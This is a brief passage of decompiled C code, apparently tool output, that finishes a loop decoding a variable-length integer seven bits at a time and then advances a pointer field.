    uVar5 = uVar5 | (bVar1 & 0x7f) << (uVar6 & 0xff);
    uVar6 = uVar6 + 7;
  } while ((bVar1 & 0x80) != 0);
  param_3[4] = pbVar8 + uVar5 + 2;
  return;
}

